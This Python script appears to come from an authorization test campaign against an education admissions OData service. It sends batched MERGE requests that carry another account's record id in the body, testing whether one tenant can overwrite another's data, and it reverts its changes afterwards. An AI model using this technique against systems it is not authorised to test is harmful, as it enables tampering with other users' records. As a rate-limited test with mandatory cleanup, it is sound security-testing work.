#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Sweep 10.2 + 10.4 — batched-write path condition test.

Prerequisite: accounts A and B each have ONE HigherEducations row seeded
via the normal admissions UI, with `nameSchool` set to
'KLTEST_S10_SEED_A' and 'KLTEST_S10_SEED_B' respectively.

The hypothesis being tested:
  Standalone MERGE /HigherEducations('0') returned 501 in Sweep 10 for BOTH
  test accounts. But services.updateCurriculumBatch in the client demonstrably
  writes to that entity — via a $batch changeset that first MERGEs
  /Curriculums('0') and then MERGEs /HigherEducations('0') with a body-encoded
  higherEducationId. So the entity IS writable — just via a specific path
  condition.

Once we can write to the entity, the actual question of S9-C1 opens up:
  does the server route the update by URL key ('0' = caller-scoped alias) or
  by body-payload higherEducationId (potentially cross-tenant)?

Test discrimination:
  Phase 10.2 = A→A (own row). Confirms the write path.
  Phase 10.4 = A→B (body-id = B's row id). Reads BOTH sessions afterwards:
    * B's row nameSchool changed  → Hyp B (body-id routed, unscoped table)
                                    — this is the crown jewel.
    * A's row got a new attribute or new row created under A → Hyp C
      (body-id routed, own-tenant scoped) — attacker-chosen id under caller.
    * Neither changed / A's original row updated instead → Hyp A
      (URL-key routed, body-id ignored) — safe.

Budget: at most 8 non-safe HTTP requests. In practice: 1-4 (10.2, optional
10.4, 1-2 cleanup MERGEs). All at MIN_INTERVAL (default 8 s/req unless
overridden).

Cleanup is MANDATORY. Any nameSchool change is reverted in a finally block
from the appropriate session (A reverts A's row, B reverts B's row).
"""
import argparse
import json
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import authz_matrix as m  # noqa: E402


def find_seed_row(rows, seed_prefix):
    """Return the row whose nameSchool starts with seed_prefix (case-insens)."""
    for row in rows:
        ns = str(row.get("nameSchool") or "")
        if ns.startswith(seed_prefix) or ns.lower().startswith(seed_prefix.lower()):
            return row
    return None


def rows_from_collection(text):
    if not text:
        return []
    try:
        obj = json.loads(text)
    except Exception:
        return []
    d = obj.get("d") if isinstance(obj, dict) else None
    if isinstance(d, dict) and "results" in d and isinstance(d["results"], list):
        return d["results"]
    return []


def batched_curriculum_merge(client, session, higher_row_body, logger, note):
    """POST /$batch with a single changeset:
        1. MERGE /Curriculums('0') with an empty body (no-op MERGE)
        2. MERGE /HigherEducations('0') with the supplied body.
    Returns (outer_status, inner_statuses_list, raw_response_text).
    """
    body, boundary = m._batch_body(
        [],
        changeset=[
            ("MERGE", "/Curriculums('0')", {}),
            ("MERGE", "/HigherEducations('0')", higher_row_body),
        ],
    )
    r = client.request(session, "POST", "$batch", body=body,
                       extra_headers={"Content-Type":
                                      f"multipart/mixed; boundary={boundary}"},
                       note=note)
    inners = m._parse_batch_inner_statuses(r.get("text", ""))
    outer = r.get("status")
    cs_shape = "MERGE /Curriculums('0'), MERGE /HigherEducations('0')"
    logger.log("10b", "$batch", "POST", note, r,
               [f"outer={outer}", f"inner_statuses={inners}",
                f"changeset={cs_shape}"])
    return outer, inners, r.get("text", "")


def main(argv=None):
    ap = argparse.ArgumentParser(description="Sweep 10.2 + 10.4 batched path")
    ap.add_argument("--append", action="store_true", default=True,
                    help="append rows to existing 02-authz-matrix.jsonl (always on)")
    ap.add_argument("--dry-run", action="store_true",
                    help="plan only; no network")
    ap.add_argument("--min-interval", type=float, default=None,
                    help="override MIN_INTERVAL (default 8 s per authz_matrix)")
    ap.add_argument("--seed-prefix-a", default="KLTEST_S10_SEED_A",
                    help="nameSchool prefix that identifies A's seeded row")
    ap.add_argument("--seed-prefix-b", default="KLTEST_S10_SEED_B",
                    help="nameSchool prefix that identifies B's seeded row")
    args = ap.parse_args(argv)

    if args.min_interval is not None:
        if args.min_interval < 1.0:
            raise SystemExit("--min-interval must be >= 1.0 s; refusing")
        m.MIN_INTERVAL = args.min_interval
    print(f"[cadence] MIN_INTERVAL={m.MIN_INTERVAL} s/req", file=sys.stderr)

    client = m.Client(dry_run=args.dry_run)
    logger = m.MatrixLogger(m.JSONL_PATH, dry_run=args.dry_run, append=True)

    if args.dry_run:
        sessions = {"A": m.Session("A", "dry=run"), "B": m.Session("B", "dry=run")}
        for s in sessions.values():
            s.csrf = "<dry-run-token>"
    else:
        sessions = m.load_sessions(client)
    sA, sB = sessions["A"], sessions["B"]

    # ------ 1. Baselines (safe reads) --------------------------------------
    rA = m.read_entity(client, sA, "Curriculums('0')/HigherEducations",
                       logger, "10b", "S10b baseline A")
    rB = m.read_entity(client, sB, "Curriculums('0')/HigherEducations",
                       logger, "10b", "S10b baseline B")
    rows_A = rows_from_collection(rA.get("text", ""))
    rows_B = rows_from_collection(rB.get("text", ""))
    a_seed = find_seed_row(rows_A, args.seed_prefix_a)
    b_seed = find_seed_row(rows_B, args.seed_prefix_b)
    logger.log("10b", "HigherEducations", "NOTE", "baseline enum",
               {"status": "n/a", "text": ""},
               [f"A_rows={len(rows_A)}", f"B_rows={len(rows_B)}",
                f"A_seed_id={a_seed.get('higherEducationId') if a_seed else None!r}",
                f"B_seed_id={b_seed.get('higherEducationId') if b_seed else None!r}"])

    if not a_seed or not b_seed:
        logger.log("10b", "HigherEducations", "NOTE",
                   "MISSING SEED ROW — human seed step incomplete",
                   {"status": "n/a", "text": ""},
                   ["seed_missing_A" if not a_seed else "",
                    "seed_missing_B" if not b_seed else ""])
        print("[HALT] one or both seed rows missing — cannot run 10.2 / 10.4",
              file=sys.stderr)
        return 2

    a_id = str(a_seed["higherEducationId"])
    b_id = str(b_seed["higherEducationId"])
    a_baseline_ns = a_seed.get("nameSchool", "")
    b_baseline_ns = b_seed.get("nameSchool", "")

    print(f"[seed] A row {a_id!r} nameSchool={a_baseline_ns!r}", file=sys.stderr)
    print(f"[seed] B row {b_id!r} nameSchool={b_baseline_ns!r}", file=sys.stderr)

    non_safe_budget = 8
    non_safe_used = 0
    a_write_landed = False
    b_write_landed = False

    try:
        # ---- 2. Phase 10.2 — own-row control ----------------------------
        variant102 = f"S10.2 batched MERGE own-row A id={a_id!r} -> KLTEST_S10_2_OWN"
        outer, inners, txt = batched_curriculum_merge(
            client, sA,
            {"higherEducationId": a_id, "nameSchool": "KLTEST_S10_2_OWN"},
            logger, variant102)
        non_safe_used += 1
        # Inner statuses: first = Curriculums MERGE, second = HigherEducations MERGE
        higher_inner_102 = inners[1] if len(inners) > 1 else None

        # ---- 3. Read A back — did 10.2 change A's row? ------------------
        rA_after102 = m.read_entity(client, sA, "Curriculums('0')/HigherEducations",
                                    logger, "10b", "S10.2 re-read A")
        rows_A_after102 = rows_from_collection(rA_after102.get("text", ""))
        a_row_after102 = None
        for row in rows_A_after102:
            if str(row.get("higherEducationId")) == a_id:
                a_row_after102 = row
                break
        a_row_updated = (
            a_row_after102 is not None
            and str(a_row_after102.get("nameSchool")) == "KLTEST_S10_2_OWN"
        )
        a_write_landed = a_row_updated
        logger.log("10b", "HigherEducations", "COMPARE", "S10.2 verify A own-row",
                   {"status": "n/a", "text": ""},
                   [f"higher_inner={higher_inner_102}",
                    f"a_row_updated={a_row_updated}",
                    f"nameSchool_now={a_row_after102.get('nameSchool') if a_row_after102 else None!r}"])

        # ---- 4. Phase 10.4 — cross-user body-id -------------------------
        # Only run if 10.2 confirmed the write path works. Otherwise the batch
        # path condition doesn't unlock writes and 10.4 gives no new info.
        if not (a_write_landed and higher_inner_102 in (200, 202, 204)):
            logger.log("10b", "HigherEducations", "NOTE",
                       "S10.4 SKIPPED — 10.2 did not confirm write path",
                       {"status": "n/a", "text": ""},
                       [f"higher_inner_102={higher_inner_102}",
                        f"a_write_landed={a_write_landed}"])
        else:
            variant104 = (f"S10.4 batched CROSS-USER MERGE body-id={b_id!r} "
                          "-> KLTEST_S10_4_CROSS")
            outer4, inners4, txt4 = batched_curriculum_merge(
                client, sA,
                {"higherEducationId": b_id, "nameSchool": "KLTEST_S10_4_CROSS"},
                logger, variant104)
            non_safe_used += 1
            higher_inner_104 = inners4[1] if len(inners4) > 1 else None

            # 4a. Read A's collection again — did A get a new row with B's id
            #     (Hyp C — own-tenant create-on-demand with attacker id)?
            rA_after104 = m.read_entity(client, sA, "Curriculums('0')/HigherEducations",
                                        logger, "10b", "S10.4 re-read A")
            rows_A_after104 = rows_from_collection(rA_after104.get("text", ""))
            a_has_b_id = any(str(r.get("higherEducationId")) == b_id
                             for r in rows_A_after104)

            # 4b. Read B's collection from B's session — did B's row change
            #     (Hyp B — cross-tenant, the crown jewel)?
            rB_after104 = m.read_entity(client, sB, "Curriculums('0')/HigherEducations",
                                        logger, "10b", "S10.4 re-read B")
            rows_B_after104 = rows_from_collection(rB_after104.get("text", ""))
            b_row_after = None
            for row in rows_B_after104:
                if str(row.get("higherEducationId")) == b_id:
                    b_row_after = row
                    break
            b_row_updated = (
                b_row_after is not None
                and str(b_row_after.get("nameSchool")) == "KLTEST_S10_4_CROSS"
            )
            b_write_landed = b_row_updated

            # 4c. Classify the outcome
            if b_row_updated:
                verdict = "HYP_B_CROSS_TENANT_WRITE_CONFIRMED_CROWN_JEWEL"
            elif a_has_b_id:
                verdict = "HYP_C_OWN_TENANT_CREATE_WITH_ATTACKER_ID"
            elif str(a_row_after102.get("nameSchool") if a_row_after102 else None) == "KLTEST_S10_4_CROSS":
                verdict = "HYP_A_PRIME_URL_KEY_ROUTED_WRITE_TO_OWN_ROW"
            elif higher_inner_104 in (200, 202, 204):
                verdict = "HYP_A_URL_KEY_ROUTED_BODY_ID_IGNORED_NO_ROW_CHANGED"
            else:
                verdict = f"WRITE_REJECTED_INNER_{higher_inner_104}"

            flags = [f"higher_inner={higher_inner_104}",
                     f"a_has_b_id={a_has_b_id}",
                     f"b_row_updated={b_row_updated}",
                     f"b_ns_now={b_row_after.get('nameSchool') if b_row_after else None!r}",
                     f"VERDICT={verdict}"]
            if verdict.endswith("CROWN_JEWEL"):
                flags.append("ANOMALY_cross_tenant_write_persisted")
            elif "HYP_C" in verdict:
                flags.append("ANOMALY_own_tenant_id_pollution")
            logger.log("10b", "HigherEducations", "COMPARE",
                       "S10.4 discriminator", {"status": "n/a", "text": ""},
                       flags)

    finally:
        # ---- 5. Cleanup — mandatory revert of any change ----------------
        if a_write_landed:
            variantR = f"S10 CLEANUP revert A own row -> {a_baseline_ns!r}"
            batched_curriculum_merge(
                client, sA,
                {"higherEducationId": a_id, "nameSchool": a_baseline_ns},
                logger, variantR)
            non_safe_used += 1
        if b_write_landed:
            # revert from B's session — B's own path to their own row
            variantR = f"S10 CLEANUP revert B own row -> {b_baseline_ns!r} (from B's session)"
            batched_curriculum_merge(
                client, sB,
                {"higherEducationId": b_id, "nameSchool": b_baseline_ns},
                logger, variantR)
            non_safe_used += 1
        # verify from BOTH sessions
        rAv = m.read_entity(client, sA, "Curriculums('0')/HigherEducations",
                            logger, "10b", "S10 cleanup verify A")
        rBv = m.read_entity(client, sB, "Curriculums('0')/HigherEducations",
                            logger, "10b", "S10 cleanup verify B")
        for label, rr, base_id, base_ns in (("A", rAv, a_id, a_baseline_ns),
                                            ("B", rBv, b_id, b_baseline_ns)):
            row = None
            for r in rows_from_collection(rr.get("text", "")):
                if str(r.get("higherEducationId")) == base_id:
                    row = r
                    break
            now = row.get("nameSchool") if row else None
            logger.log("10b", "HigherEducations", "CLEANUP_VERIFY",
                       f"{label} ok={str(now) == str(base_ns)}",
                       {"status": "n/a", "text": ""},
                       [f"cleanup_ok={str(now) == str(base_ns)}",
                        f"expected={base_ns!r}", f"observed={now!r}"])
        print(f"[budget] non-safe requests used: {non_safe_used}/{non_safe_budget}",
              file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
